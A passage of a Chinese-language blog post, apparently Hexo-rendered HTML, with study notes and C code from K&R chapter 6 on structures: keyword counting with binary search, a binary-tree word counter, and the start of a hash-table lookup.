class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXWORD 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *word;</span><br><span class=\"line\">    <span class=\"type\">int</span> count;</span><br><span class=\"line\">&#125; keytab[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;auto&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;break&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;case&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;char&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;const&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;continue&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;default&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;unsigned&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;void&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;volatile&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;while&quot;</span>,<span class=\"number\">0</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如何定义查找的结构体的长度呢?</span></span><br><span class=\"line\"><span class=\"comment\">//#define NKEYS (sizeof keytab / sizeof(struct key))</span></span><br><span class=\"line\"><span class=\"comment\">// 下面这种更好,即使类型改变了,也不需要改动程序</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NKEYS (sizeof keytab / sizeof keytab[0])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> key *<span class=\"title function_\">binsearch</span><span class=\"params\">(<span class=\"type\">char</span> *, <span class=\"keyword\">struct</span> key *,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> word[MAXWORD];</span><br><span class=\"line\"> \t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> *<span class=\"title\">p</span>;</span>   </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (getword(word,MAXWORD) != EOF)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">isalpha</span>(word[<span class=\"number\">0</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((p = binsearch(word, keytab, NKEYS)) != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">                p-&gt;count++;</span><br><span class=\"line\">   \t<span class=\"keyword\">for</span>(p = keytab; p &lt; keytab + NKEYS;p++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;count &gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%4d %s\\n&quot;</span>,p-&gt;count, p-&gt;word);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 折半查找函数 、在tab[0]&lt;=tab[1]&lt;=tab[2]&lt;=....tab[n-1]中查找word</span></span><br><span class=\"line\"><span class=\"comment\">//这种函数风格可以较好的看出类型来</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> key *</span><br><span class=\"line\"><span class=\"title function_\">binsearch</span><span class=\"params\">(<span class=\"type\">char</span> *word,<span class=\"keyword\">struct</span> key *tab,<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> cond;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> *<span class=\"title\">low</span> =</span> &amp;tab[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> *<span class=\"title\">high</span> =</span> &amp;tab[n];</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span> *<span class=\"title\">mid</span>;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(low &lt; high)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mid = low + (high-low)/<span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((cond = <span class=\"built_in\">strcmp</span>(word,mid-&gt;word)) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            high = mid;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(cond &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            low = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>; <span class=\"comment\">//没有匹配的值</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//从输入中读取下一个单词或字符</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *word, <span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,getch(<span class=\"type\">void</span>);</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> *w = word;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">isspace</span>(c = getch())) ; </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c!=EOF)</span><br><span class=\"line\">        *w++ = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalpha</span>(c))&#123; <span class=\"comment\">//说明是单个字符,</span></span><br><span class=\"line\">        *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; --lim &gt;<span class=\"number\">0</span>; w++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalnum</span>(*w=getch()))&#123;</span><br><span class=\"line\">            ungetch(*w);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> word[<span class=\"number\">0</span>];<span class=\"comment\">//为啥要这样呢????, 为什么不是word呢,</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> BUFSIZE 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> buf[BUFSIZE];</span><br><span class=\"line\"><span class=\"type\">int</span> bufp = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getch</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (bufp &gt; <span class=\"number\">0</span>)? buf[--bufp] : getchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bufp &gt;= BUFSIZE)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ungetch: too many characters\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        buf[bufp++] = c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"6-5-自引用结构\"><a href=\"#6-5-自引用结构\" class=\"headerlink\" title=\"6.5 自引用结构\"></a>6.5 自引用结构</h2><p>​\t\t用二叉树来存储</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXWORD 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> tnode *<span class=\"title function_\">addtree</span><span class=\"params\">(<span class=\"keyword\">struct</span> tnode *p, <span class=\"type\">char</span> *w)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">treeprint</span><span class=\"params\">(<span class=\"keyword\">struct</span> tnode *p)</span>;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> tnode *<span class=\"title function_\">talloc</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">strdup1</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *word, <span class=\"type\">int</span> lim)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tnode</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *word;</span><br><span class=\"line\">    <span class=\"type\">int</span> count;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tnode</span> *<span class=\"title\">left</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tnode</span> *<span class=\"title\">right</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tnode</span> *<span class=\"title\">root</span>;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> word[MAXWORD];</span><br><span class=\"line\">    </span><br><span class=\"line\">    root = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(getword(word,MAXWORD)!=EOF)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">isalpha</span>(word[<span class=\"number\">0</span>]))</span><br><span class=\"line\">            root = addtree(root,word);</span><br><span class=\"line\">    treeprint(root);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> tnode *<span class=\"title function_\">talloc</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> tnode *<span class=\"title function_\">addtree</span><span class=\"params\">(<span class=\"keyword\">struct</span> tnode *p, <span class=\"type\">char</span> *w)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> cond;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        p = talloc();<span class=\"comment\">//创建一个新节点</span></span><br><span class=\"line\">        p-&gt;word = strdup1(w);</span><br><span class=\"line\">        p-&gt;count = <span class=\"number\">1</span>;</span><br><span class=\"line\">        p-&gt;left = p-&gt;right = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((cond = <span class=\"built_in\">strcmp</span>(w,p-&gt;word)) == <span class=\"number\">0</span> )</span><br><span class=\"line\">        p-&gt;count++;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(cond &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        p-&gt;left = addtree(p-&gt;left,w);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        p-&gt;right=addtree(p-&gt;right,w);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//按顺序打印二叉树p</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">treeprint</span><span class=\"params\">(<span class=\"keyword\">struct</span> tnode *p)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p!=<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        treeprint(p-&gt;left);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%4d %s\\n&quot;</span>,p-&gt;count,p-&gt;word);</span><br><span class=\"line\">        treeprint(p-&gt;right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">//创建一个tnode</span></span><br><span class=\"line\"><span class=\"comment\">//用sizeof计算大小更准确,考虑到对齐等</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> tnode *<span class=\"title function_\">talloc</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">struct</span> tnode *) <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> tnode));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">strdup1</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p;</span><br><span class=\"line\">    </span><br><span class=\"line\">    p = (<span class=\"type\">char</span> *) <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(s)+<span class=\"number\">1</span>);<span class=\"comment\">//+1是因为结尾要加\\0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(p,s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//从输入中读取下一个单词或字符</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *word, <span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,getch(<span class=\"type\">void</span>);</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> *w = word;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">isspace</span>(c = getch())) ; </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c!=EOF)</span><br><span class=\"line\">        *w++ = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalpha</span>(c))&#123; <span class=\"comment\">//说明是单个字符,</span></span><br><span class=\"line\">        *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; --lim &gt;<span class=\"number\">0</span>; w++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalnum</span>(*w=getch()))&#123;</span><br><span class=\"line\">            ungetch(*w);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> word[<span class=\"number\">0</span>];<span class=\"comment\">//为啥要这样呢????, 为什么不是word呢,</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> BUFSIZE 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> buf[BUFSIZE];</span><br><span class=\"line\"><span class=\"type\">int</span> bufp = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getch</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (bufp &gt; <span class=\"number\">0</span>)? buf[--bufp] : getchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bufp &gt;= BUFSIZE)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ungetch: too many characters\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        buf[bufp++] = c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"6-6-表查找\"><a href=\"#6-6-表查找\" class=\"headerlink\" title=\"6.6 表查找\"></a>6.6 表查找</h2><p>​\t\t之前学过的,用散列等方法,进行查表</p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/image-20231005204531775.png\" alt=\"image-20231005204531775\" style=\"zoom:50%;\">\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span>&#123;</span> <span class=\"comment\">//链表项</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">next</span>;</span> <span class=\"comment\">//链表中下一个表项</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *name;\t\t\t<span class=\"comment\">//定义的名字</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *defn;\t\t\t<span class=\"comment\">//替换文本</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> HASHSIZE 101</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">hashtab</span>[<span class=\"title\">HASHSIZE</span>];</span> <span class=\"comment\">//指针表</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t散列函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// hash函数, 为字符串s生成散列值</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"title function_\">hash</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> hashval;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(hashval=<span class=\"number\">0</span>; *s !=<span class=\"string\">&#x27;\\0&#x27;</span>;s++)</span><br><span class=\"line\">        hashval = *s + <span class=\"number\">31</span>* hashval;  <span class=\"comment\">//数字的相加</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashval % HASHSIZE:</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t查找函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">lookup</span><span class=\"params\">(<span class=\"type\">char</span> *s)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlist</span> *<span class=\"title\">np</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (np = hashtab[hash(s)]; np != <span class=\"literal\">NULL</span>; np = np-&gt;next)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(s, np-&gt;name) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> np;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t加入函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> nlist *<span class=\"title function_\">lookup</span><span 